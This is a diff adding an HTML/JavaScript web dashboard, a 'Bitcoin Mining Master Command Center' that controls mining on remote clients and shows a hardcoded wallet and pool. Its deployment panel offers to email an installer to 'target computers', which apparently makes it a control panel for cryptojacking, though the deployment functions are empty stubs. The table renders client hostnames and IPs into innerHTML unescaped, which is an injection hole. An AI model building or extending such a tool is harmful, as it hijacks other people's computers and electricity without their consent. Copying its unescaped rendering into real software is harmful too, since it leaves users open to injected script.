@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bitcoin Mining Master Command Center</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            background: #000000;
+            color: #ffffff;
+            overflow-x: hidden;
+        }
+
+        .header {
+            background: #111111;
+            padding: 15px;
+            border-bottom: 2px solid #00ff00;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #00ff00;
+        }
+
+        .status-bar {
+            display: flex;
+            gap: 20px;
+            font-size: 12px;
+        }
+
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .status-indicator {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #00ff00;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .main-content {
+            margin-top: 80px;
+            padding: 20px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .panel {
+            background: #111111;
+            border: 1px solid #333333;
+            border-radius: 5px;
+            padding: 20px;
+        }
+
+        .panel-header {
+            font-size: 16px;
+            font-weight: bold;
+            color: #00ff00;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #333333;
+            padding-bottom: 10px;
+        }
+
+        .metrics-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .metric-card {
+            background: #000000;
+            border: 1px solid #444444;
+            padding: 15px;
+            text-align: center;
+            border-radius: 3px;
+        }
+
+        .metric-value {
+            font-size: 24px;
+            font-weight: bold;
+            color: #00ff00;
+            margin-bottom: 5px;
+        }
+
+        .metric-label {
+            font-size: 11px;
+            color: #888888;
+            text-transform: uppercase;
+        }
+
+        .controls {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .control-btn {
+            background: #222222;
+            border: 1px solid #444444;
+            color: #ffffff;
+            padding: 10px 15px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            border-radius: 3px;
+            transition: all 0.3s ease;
+        }
+
+        .control-btn:hover {
+            background: #333333;
+            border-color: #00ff00;
+        }
+
+        .control-btn.active {
+            background: #00ff00;
+            color: #000000;
+            border-color: #00ff00;
+        }
+
+        .control-btn.danger {
+            background: #ff0000;
+            color: #ffffff;
+            border-color: #ff0000;
+        }
+
+        .control-btn.danger:hover {
+            background: #cc0000;
+        }
+
+        .full-width {
+            grid-column: 1 / -1;
+        }
+
+        .clients-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 12px;
+        }
+
+        .clients-table th,
+        .clients-table td {
+            border: 1px solid #333333;
+            padding: 8px;
+            text-align: left;
+        }
+
+        .clients-table th {
+            background: #222222;
+            color: #00ff00;
+            font-weight: bold;
+        }
+
+        .clients-table tr:nth-child(even) {
+            background: #111111;
+        }
+
+        .status-mining {
+            color: #00ff00;
+        }
+
+        .status-offline {
+            color: #ff0000;
+        }
+
+        .status-connecting {
+            color: #ffff00;
+        }
+
+        .profitability-chart {
+            height: 200px;
+            background: #000000;
+            border: 1px solid #333333;
+            margin: 15px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .chart-line {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            height: 100%;
+            width: 2px;
+            background: linear-gradient(to top, #00ff00, transparent);
+            animation: chartGrow 3s ease-out;
+        }
+
+        @keyframes chartGrow {
+            from { height: 0; }
+            to { height: 100%; }
+        }
+
+        .alerts-panel {
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .alert {
+            background: #222222;
+            border-left: 4px solid #ff0000;
+            padding: 10px;
+            margin-bottom: 10px;
+            font-size: 11px;
+        }
+
+        .alert.warning {
+            border-left-color: #ffff00;
+        }
+
+        .alert.info {
+            border-left-color: #00ff00;
+        }
+
+        .alert-time {
+            color: #888888;
+            font-size: 10px;
+        }
+
+        .deployment-section {
+            background: #000000;
+            border: 1px solid #333333;
+            padding: 15px;
+            margin-top: 15px;
+        }
+
+        .deployment-controls {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .deployment-method {
+            background: #111111;
+            border: 1px solid #444444;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .deployment-method h4 {
+            color: #00ff00;
+            margin-bottom: 10px;
+        }
+
+        .deployment-method p {
+            font-size: 11px;
+            color: #888888;
+            margin-bottom: 15px;
+        }
+
+        .terminal-output {
+            background: #000000;
+            border: 1px solid #333333;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            height: 200px;
+            overflow-y: auto;
+            margin-top: 15px;
+        }
+
+        .terminal-line {
+            margin-bottom: 2px;
+        }
+
+        .terminal-line.success {
+            color: #00ff00;
+        }
+
+        .terminal-line.error {
+            color: #ff0000;
+        }
+
+        .terminal-line.warning {
+            color: #ffff00;
+        }
+
+        .terminal-line.info {
+            color: #00ffff;
+        }
+
+        .refresh-btn {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #00ff00;
+            color: #000000;
+            border: none;
+            padding: 15px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 18px;
+            box-shadow: 0 4px 8px rgba(0, 255, 0, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .refresh-btn:hover {
+            background: #00cc00;
+            transform: scale(1.1);
+        }
+
+        @media (max-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+            
+            .deployment-controls {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">⛏️ BITCOIN MINING MASTER COMMAND CENTER</div>
+        <div class="status-bar">
+            <div class="status-item">
+                <div class="status-indicator"></div>
+                <span>MAIN SERVER: ONLINE</span>
+            </div>
+            <div class="status-item">
+                <div class="status-indicator"></div>
+                <span>MINING: ACTIVE</span>
+            </div>
+            <div class="status-item">
+                <div class="status-indicator"></div>
+                <span>CLIENTS: <span id="clientCount">0</span></span>
+            </div>
+            <div class="status-item">
+                <div class="status-indicator"></div>
+                <span>PROFIT: $<span id="totalProfit">0.00</span>/DAY</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <!-- Global Mining Control -->
+        <div class="panel">
+            <div class="panel-header">🌐 GLOBAL MINING CONTROL</div>
+            <div class="metrics-grid">
+                <div class="metric-card">
+                    <div class="metric-value" id="totalHashrate">0.0</div>
+                    <div class="metric-label">Total Hashrate (MH/s)</div>
+                </div>
+                <div class="metric-card">
+                    <div class="metric-value" id="totalShares">0</div>
+                    <div class="metric-label">Accepted Shares</div>
+                </div>
+                <div class="metric-card">
+                    <div class="metric-value" id="activeClients">0</div>
+                    <div class="metric-label">Active Clients</div>
+                </div>
+                <div class="metric-card">
+                    <div class="metric-value" id="currentAlgorithm">BTC</div>
+                    <div class="metric-label">Algorithm</div>
+                </div>
+            </div>
+            <div class="controls">
+                <button class="control-btn" id="startAllBtn">START ALL MINING</button>
+                <button class="control-btn danger" id="stopAllBtn">STOP ALL MINING</button>
+                <button class="control-btn" id="optimizeBtn">OPTIMIZE ALL</button>
+                <button class="control-btn" id="restartBtn">RESTART ALL</button>
+            </div>
+        </div>
+
+        <!-- Profitability Monitor -->
+        <div class="panel">
+            <div class="panel-header">💰 PROFITABILITY MONITOR</div>
+            <div class="metrics-grid">
+                <div class="metric-card">
+                    <div class="metric-value" id="btcPrice">$0</div>
+                    <div class="metric-label">BTC Price</div>
+                </div>
+                <div class="metric-card">
+                    <div class="metric-value" id="dailyEarnings">$0.00</div>
+                    <div class="metric-label">Daily Earnings</div>
+                </div>
+                <div class="metric-card">
+                    <div class="metric-value" id="efficiency">0.0</div>
+                    <div class="metric-label">Efficiency (H/W)</div>
+                </div>
+                <div class="metric-card">
+                    <div class="metric-value" id="powerUsage">0W</div>
+                    <div class="metric-label">Power Usage</div>
+                </div>
+            </div>
+            <div class="profitability-chart">
+                <div class="chart-line"></div>
+            </div>
+            <div class="controls">
+                <button class="control-btn" id="switchAlgorithmBtn">SWITCH ALGORITHM</button>
+                <button class="control-btn" id="optimizeProfitBtn">OPTIMIZE PROFIT</button>
+            </div>
+        </div>
+
+        <!-- Remote Clients -->
+        <div class="panel full-width">
+            <div class="panel-header">🖥️ REMOTE CLIENTS</div>
+            <table class="clients-table">
+                <thead>
+                    <tr>
+                        <th>Client ID</th>
+                        <th>Location</th>
+                        <th>Status</th>
+                        <th>Hashrate</th>
+                        <th>Shares</th>
+                        <th>Uptime</th>
+                        <th>Temperature</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="clientsTableBody">
+                    <tr>
+                        <td colspan="8" style="text-align: center; color: #888888;">No remote clients connected</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- System Alerts -->
+        <div class="panel">
+            <div class="panel-header">🚨 SYSTEM ALERTS</div>
+            <div class="alerts-panel" id="alertsPanel">
+                <div class="alert info">
+                    <div class="alert-time">Just now</div>
+                    <div>System initialized successfully</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Deployment Center -->
+        <div class="panel">
+            <div class="panel-header">🚀 DEPLOYMENT CENTER</div>
+            <div class="deployment-section">
+                <h4 style="color: #00ff00; margin-bottom: 10px;">Deploy Mining Clients</h4>
+                <div class="deployment-controls">
+                    <div class="deployment-method">
+                        <h4>📧 Email Deployment</h4>
+                        <p>Send installer via email to target computers</p>
+                        <button class="control-btn" onclick="deployViaEmail()">EMAIL DEPLOY</button>
+                    </div>
+                    <div class="deployment-method">
+                        <h4>🌐 Direct Download</h4>
+                        <p>Provide direct download link for installation</p>
+                        <button class="control-btn" onclick="generateDownloadLink()">GENERATE LINK</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- System Terminal -->
+        <div class="panel full-width">
+            <div class="panel-header">💻 SYSTEM TERMINAL</div>
+            <div class="terminal-output" id="terminalOutput">
+                <div class="terminal-line success">[SYSTEM] Bitcoin Mining Master Command Center initialized</div>
+                <div class="terminal-line info">[INFO] Server running on http://192.168.1.168:3000</div>
+                <div class="terminal-line info">[INFO] Mining pool: stratum+tcp://btc.ss.poolin.com:443</div>
+                <div class="terminal-line info">[INFO] Wallet: bc1qz2zqqgdz7whfmmkpcthn5gkv4ew4dfjs6fyeat</div>
+                <div class="terminal-line success">[SUCCESS] Ready for mining operations</div>
+            </div>
+        </div>
+    </div>
+
+    <button class="refresh-btn" onclick="refreshAll()" title="Refresh All Data">🔄</button>
+
+    <script>
+        let miningState = {
+            allMining: false,
+            clients: [],
+            profitability: {},
+            alerts: []
+        };
+
+        // Initialize dashboard
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🚀 Master Command Center initialized');
+            refreshAll();
+            setInterval(refreshAll, 30000); // Refresh every 30 seconds
+        });
+
+        // Refresh all data
+        async function refreshAll() {
+            try {
+                await Promise.all([
+                    updateMiningStatus(),
+                    updateClients(),
+                    updateProfitability(),
+                    updateAlerts()
+                ]);
+                addTerminalLog('info', 'All systems refreshed successfully');
+            } catch (error) {
+                addTerminalLog('error', 'Failed to refresh systems: ' + error.message);
+            }
+        }
+
+        // Update mining status
+        async function updateMiningStatus() {
+            try {
+                const response = await fetch('/api/status');
+                const data = await response.json();
+                
+                if (data.success) {
+                    document.getElementById('totalHashrate').textContent = data.data.hashrate.toFixed(1);
+                    document.getElementById('totalShares').textContent = data.data.shares.accepted;
+                    document.getElementById('currentAlgorithm').textContent = data.data.algorithm || 'BTC';
+                    
+                    miningState.allMining = data.data.isRunning;
+                    updateMiningButtons();
+                }
+            } catch (error) {
+                console.error('Failed to update mining status:', error);
+            }
+        }
+
+        // Update clients
+        async function updateClients() {
+            try {
+                const response = await fetch('/api/remote-clients');
+                const data = await response.json();
+                
+                if (data.success) {
+                    miningState.clients = data.clients;
+                    document.getElementById('clientCount').textContent = data.totalClients;
+                    document.getElementById('activeClients').textContent = data.activeClients;
+                    renderClientsTable(data.clients);
+                }
+            } catch (error) {
+                console.error('Failed to update clients:', error);
+            }
+        }
+
+        // Render clients table
+        function renderClientsTable(clients) {
+            const tbody = document.getElementById('clientsTableBody');
+            
+            if (clients.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="8" style="text-align: center; color: #888888;">No remote clients connected</td></tr>';
+                return;
+            }
+            
+            tbody.innerHTML = clients.map(client => `
+                <tr>
+                    <td>${client.hostname || client.id}</td>
+                    <td>${client.ip || 'Unknown'}</td>
+                    <td><span class="status-${client.status}">${client.status.toUpperCase()}</span></td>
+                    <td>${client.hashrate.toFixed(1)} MH/s</td>
+                    <td>${client.shares.accepted}</td>
+                    <td>${formatUptime(client.uptime)}</td>
+                    <td>${client.temperature}°C</td>
+                    <td>
+                        <button class="control-btn" onclick="controlClient('${client.hostname}', 'start')">START</button>
+                        <button class="control-btn danger" onclick="controlClient('${client.hostname}', 'stop')">STOP</button>
+                    </td>
+                </tr>
+            `).join('');
+        }
+
+        // Update profitability
+        async function updateProfitability() {
+            try {
+                const response = await fetch('/api/earnings');
+                const data = await response.json();
+                
+                if (data.success) {
+                    document.getElementById('btcPrice').textContent = '$' + data.btcPrice.toLocaleString();
+                    document.getElementById('dailyEarnings').textContent = '$' + data.earnings.usd.daily.toFixed(2);
+                    document.getElementById('totalProfit').textContent = data.earnings.usd.daily.toFixed(2);
+                    
+                    // Calculate efficiency (simplified)
+                    const hashrate = parseFloat(document.getElementById('totalHashrate').textContent);
+                    const power = 150; // Estimated power usage
+                    const efficiency = power > 0 ? (hashrate / power).toFixed(2) : '0.00';
+                    document.getElementById('efficiency').textContent = efficiency;
+                    document.getElementById('powerUsage').textContent = power + 'W';
+                }
+            } catch (error) {
+                console.error('Failed to update profitability:', error);
+            }
+        }
+
+        // Update alerts
+        async function updateAlerts() {
+            // This would fetch real alerts from the server
+            // For now, we'll simulate some alerts
+            const alertsPanel = document.getElementById('alertsPanel');
+            
+            // Keep only recent alerts
+            const recentAlerts = miningState.alerts.slice(-5);
+            alertsPanel.innerHTML = recentAlerts.map(alert => `
+                <div class="alert ${alert.type}">
+                    <div class="alert-time">${new Date(alert.timestamp).toLocaleTimeString()}</div>
+                    <div>${alert.message}</div>
+                </div>
+            `).join('');
+        }
+
+        // Mining control functions
+        async function startAllMining() {
+            try {
+                const response = await fetch('/api/start-mining', { method: 'POST' });
+                const data = await response.json();
+                
+                if (data.success) {
+                    miningState.allMining = true;
+                    updateMiningButtons();
+                    addTerminalLog('success', 'All mining started successfully');
+                    addAlert('info', 'All mining operations started');
+                }
+            } catch (error) {
+                addTerminalLog('error', 'Failed to start mining: ' + error.message);
+            }
+        }
+
+        async function stopAllMining() {
+            try {
+                const response = await fetch('/api/stop-mining', { method: 'POST' });
+                const data = await response.json();
+                
+                if (data.success) {
+                    miningState.allMining = false;
+                    updateMiningButtons();
+                    addTerminalLog('success', 'All mining stopped successfully');
+                    addAlert('warning', 'All mining operations stopped');
+                }
+            } catch (error) {
+                addTerminalLog('error', 'Failed to stop mining: ' + error.message);
+            }
+        }
+
+        // Update mining buttons
+        function updateMiningButtons() {
+            const startBtn = document.getElementById('startAllBtn');
+            const stopBtn = document.getElementById('stopAllBtn');
+            
+            if (miningState.allMining) {
+                startBtn.classList.add('active');
+                stopBtn.classList.remove('active');
+            } else {
+                startBtn.classList.remove('active');
+                stopBtn.classList.add('active');
+            }
+        }
+
+        // Control individual client
+        async function controlClient(clientId, action) {
+            try {
+                const response = await fetch(`/api/client/${action}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ clientId })
+                });
+                
+                if (response.ok) {
+                    addTerminalLog('success', `Client ${clientId} ${action} command sent`);
+                }
+            } catch (error) {
+                addTerminalLog('error', `Failed to ${action} client ${clientId}: ` + error.message);
+            }
+        }
+
+        // Deployment functions
+        async function deployViaEmail() {
+            addTerminalLog('info', 'Email deployment initiated...');
+            // Implementation for email deployment
+        }
+
+        async function generateDownloadLink() {
+            addTerminalLog('info', 'Generating download link...');
+            // Implementation for download link generation
+        }
+
+        // Utility functions
+        function formatUptime(seconds) {
+            const hours = Math.floor(seconds / 3600);
+            const minutes = Math.floor((seconds % 3600) / 60);
+            return `${hours}h ${minutes}m`;
+        }
+
+        function addTerminalLog(type, message) {
+            const terminal = document.getElementById('terminalOutput');
+            const line = document.createElement('div');
+            line.className = `terminal-line ${type}`;
+            line.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+            
+            // Keep only last 50 lines
+            const lines = terminal.children;
+            if (lines.length > 50) {
+                terminal.removeChild(lines[0]);
+            }
+        }
+
+        function addAlert(type, message) {
+            miningState.alerts.push({
+                timestamp: Date.now(),
+                type: type,
+                message: message
+            });
+        }
+
+        // Event listeners
+        document.getElementById('startAllBtn').addEventListener('click', startAllMining);
+        document.getElementById('stopAllBtn').addEventListener('click', stopAllMining);
+    </script>
+</body>
+</html>
+
